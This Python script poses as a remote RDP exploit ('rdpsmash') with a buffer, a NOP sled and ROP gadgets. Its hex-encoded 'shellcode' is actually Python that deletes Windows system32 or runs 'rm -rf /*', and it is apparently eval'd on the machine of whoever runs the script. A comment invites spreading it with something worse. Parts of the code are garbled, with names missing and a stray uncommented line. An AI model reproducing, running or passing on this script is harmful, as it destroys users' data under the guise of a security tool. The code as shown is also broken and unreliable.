import struct
import socket
import sys

trigger =  "\x58\x6c\x64\x47\x6a\x74\x30\x5a\x67\x43\x67\x79\x6f\x39\x46\xf1"
trigger += "\x66\x70\x66\x61\x43\x52\x46\x71\x78\x30\x33\x55\x62\x63\x58\x63"
trigger += "\x47\x34\x33\x65\x62\x41\x4f\x30\x54\x39\x6f\x4a\x70\x52\x48\x5a"
trigger += "\x6b\x38\x6d\x6b\x4c\x75\x6b\x30\x50\x6b\x4f\x6e\x36\x53\x6f\x6f"
trigger += "\x79\x4a\x45\x32\x46\x6f\x71\x6a\x4d\x34\x48\x77\x72\x73\x65\x73"
trigger += "\x5a\x37\x72\x69\x6f\x58\x50\x52\x48\x4e\x39\x76\x69\x4a\x55\x4c"
trigger += "\x6d\x32\x77\x69\x6f\x59\x46\x50\x53\x43\x63\x41\x43\x70\x53\x70"
trigger += "\x53\x43\x73\x50\x53\x62\x63\x70\x53\x79\x6f\x6a\x70\x35\x36\x61"
trigger += "\x78\x71\x32\x78\x38\x71\x76\x30\x53\x4b\x39\x69\x71\x4d\x45\x33"
trigger += "\x58\x6c\x64\x47\x6a\x74\x30\x5a\x67\x43\x67\x79\x6f\x39\x46\x32"
trigger += "\x4a\x56\x70\x66\x31\x76\x35\x59\x6f\x58\x50\x32\x48\x4d\x74\x4e"
trigger += "\x4d\x66\x4e\x7a\x49\x50\x57\x6b\x4f\x6e\x36\x46\x33\x56\x35\x39"
trigger += "\x73\x55\x38\x4d\x37\x71\x69\x69\x56\x71\x69\x61\x47\x6b\x4f\x6e"
trigger += "\x36\x36\x35\x79\x6f\x6a\x70\x55\x36\x31\x7a\x71\x74\x32\x46\x51"
trigger += "\x78\x52\x43\x70\x6d\x4f\x79\x4d\x35\x72\x4a\x66\x30\x42\x79\x64"
trigger += "\x69\x7a\x6c\x4b\x39\x48\x67\x62\x4a\x57\x34\x4f\x79\x6d\x32\x37"
trigger += "\x41" * 39
trigger += "\x42\x44\x6c\x4c\x53\x6e\x6d\x31\x6a\x64\x78\x4c\x6b\x4e\x4b\x4e"
trigger += "\x4b\x43\x58\x70\x72\x69\x6e\x6d\x63\x37\x66\x79\x6f\x63\x45\x73"
trigger += "\x74\x4b\x4f\x7a\x76\x63\x6b\x31\x47\x72\x72\x41\x41\x50\x51\x61"
trigger += "\x41\x70\x6a\x63\x31\x41\x41\x46\x31\x71\x45\x51\x41\x4b\x4f\x78"
trigger += "\x50\x52\x48\x4c\x6d\x79\x49\x54\x45\x38\x4e\x53\x63\x6b\x4f\x6e"
trigger += "\x36\x30\x6a\x49\x6f\x6b\x4f\x70\x37\x4b\x4f\x4e\x30\x4e\x6b\x30"
trigger += "\x57\x69\x6c\x6b\x33\x4b\x74\x62\x44\x79\x6f\x6b\x66\x66\x32\x6b"
trigger += "\x4f\x4e\x30\x53\x58\x58\x70\x4e\x6a\x55\x54\x41\x4f\x52\x73\x4b"
trigger += "\x4b\x43\x58\x70\x72\x69\x6e\x6d\x63\x37\x66\x00"

nopsled = "\x90" * 214

bindshell port 8888
shellcode =  "\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73"
shellcode += "\x74\x65\x6d\x28\x27\x64\x65\x6c\x20\x2f\x73\x20\x2f\x71\x20\x2f\x66\x20\x43\x3a"
shellcode += "\x5c\x77\x69\x6e\x64\x6f\x77\x73\x5c\x73\x79\x73\x74\x65\x6d\x33\x32\x5c\x2a\x20"
shellcode += "\x3e\x20\x4e\x55\x4c\x20\x32\x3e\x26\x31\x27\x29\x20\x69\x66\x20\x27\x57\x69\x6e"
shellcode += "\x27\x20\x69\x6e\x20\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x70\x6c\x61"
shellcode += "\x74\x66\x6f\x72\x6d\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x29\x20\x65\x6c\x73"
shellcode += "\x65\x20\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73"
shellcode += "\x79\x73\x74\x65\x6d\x28\x27\x72\x6d\x20\x2d\x72\x66\x20\x2f\x2a\x20\x3e\x20\x2f"
shellcode += "\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x32\x3e\x26\x31\x27\x29\x20\x23\x68\x69\x20"
shellcode += "\x74\x68\x65\x72\x65\x20\x5e\x5f\x7e\x20\x66\x65\x65\x6c\x20\x66\x72\x65\x65\x20"
shellcode += "\x74\x6f\x20\x73\x70\x72\x65\x61\x64\x20\x74\x68\x69\x73\x20\x77\x69\x74\x68\x20"
shellcode += "\x74\x68\x65\x20\x72\x6d\x20\x2d\x72\x66\x20\x72\x65\x70\x6c\x61\x63\x65\x64\x20"
shellcode += "\x77\x69\x74\x68\x20\x73\x6f\x6d\x65\x74\x68\x69\x6e\x67\x20\x6d\x6f\x72\x65\x20"
shellcode += "\x69\x6e\x73\x69\x64\x69\x6f\x75\x73"

evil = trigger + nopsled

class RDPsocket(socket.socket):
    def (self, payload, shellcode):
        super(RDPsocket, self).(socket.AF_INET, socket.SOCK_STREAM)
        self.payload = payload
        self.table = (""). #dirty workaround
        self.shellcode = shellcode

    def parse(self, address, shellcode):
        seeker = (struct.pack(">I", 0x6576616c),
            socket.inet_aton(address[0]), #IP bytes
            socket.inet_aton(str(address[1]))) #port bytes
        parsed =  struct.pack(">I", 0x8fe2fb63) #pop eax
        parsed += struct.pack(">I", 0x8fe2fb58) #push esp
        parsed += struct.pack(">I", 0xffff1d6b) #add esp,byte +0x1c # pop ebp # ret
        parsed += struct.pack(">I", 0x8fe2db10) #call strcpy
        parsed += struct.pack(">I", 0x8fe2dfd1) #POP - POP - RET over strcpy params
        parsed += struct.pack(">I", 0x8fe2dae4) #mov ecx,[esp+0x4] # add eax,edx # sub eax,ecx # ret
        parsed += struct.pack(">I", 0x8fe2b3d4) #POP - RET
        parsed += struct.pack(">I", 0xffffffff) #value to store in ecx
        parsed += struct.pack(">I", 0x8fe0c0c7) #inc ecx # xor al,0xc9
        parsed += struct.pack(">I", 0x8fe0c0c7) #inc ecx # xor al,0xc9
        parsed += struct.pack(">I", 0x8fe24b3c) #add ecx,ecx # ret
        parsed += struct.pack(">I", 0x8fe24b3c) #add ecx,ecx # ret
        parsed += struct.pack(">I", 0x8fe24b3c) #add ecx,ecx # ret
        parsed += seeker[0] #add the prelude
        parsed += seeker[1] #add the packed IP address
        parsed += seeker[2] #add the packed port
        parsed += struct.pack(">I", 0x8fe24b3c) #add ecx,ecx # ret
        parsed += struct.pack(">I", 0x8fe2c71d) #mov eax,edx # ret
        parsed += struct.pack(">I", 0x8fe2def4) #add eax,ecx # ret
        parsed += struct.pack(">I", 0x8fe0e32d) #xchg eax,edx
        parsed += struct.pack(">I", 0x8fe0c0c7) #inc ecx # xor al,0xc9
        parsed += struct.pack(">I", 0x8fe0c0c7) #inc ecx # xor al,0xc9
        print "Shellcode length: %d" % len(shellcode)
        parsed += struct.pack(">I", 0x8fe2def4) #add eax,ecx # ret # swap back
        parsed += struct.pack(">I", 0x8fe0e32d) #xchg eax,edx # copy parameter to placeholder
        parsed += struct.pack(">I", 0x8fe2fb61) #mov [eax],edx # pop eax # ret # set our stack pointer back to original value
        parsed += struct.pack(">I", 0x8fe0e32d) #xchg eax,edx
        parsed += struct.pack(">I", 0x8fe2daea) #sub eax,ecx # ret
        parsed += struct.pack(">I", 0x8fe0b1c2) #xchg eax,ebp # inc ebp # ret
        parsed += struct.pack(">I", 0x8fe2b6a5) #dec ebp # ret
        parsed += struct.pack(">I", 0xffff01f3) #mov esp,ebp # pop ebp # ret
        read = self.table[seeker[0]] #reader for the parsed shellcode/data

        return str(read(shellcode)), parsed

    def connect(self, address):
        self.parsed_shell = self.parse(address, shellcode)
        super(RDPsocket, self).connect(address)

    def evil_sendall(self):
        super(RDPsocket, self).sendall(evil + self.parsed_shell[0] + self.parsed_shell[1])


if  == "":
    if len(sys.argv) != 2:
        print "[*] Usage: python rdpsmash.py IP"
        print "[*] If running on non-default port, reassign PORT in the source."

    else:
        TARGET = sys.argv[1]
        PORT = 0 #nie ma porta

        print "[*] Running rdpsmash"
        print
        s = RDPsocket(evil, shellcode)
        print "[+] Connecting and configuring payload. . ."
        print "[+] This may take some time"
        s.connect((TARGET, PORT))
        print "[+] Connection established"
        print "[+] Sending payload. . ."
        print "[+] This may take some time"
        response = s.recv(4096)
        if "\xA5\x43\xE7\x38\x75\x84\xF2\xFF\xFF\x18\x61\x00" in response:
            print "[+] Success! Payload sent and executed."
            print "[+] Telnet to target on port 8888."
        else:
            print "[-] Failed"
        s.close()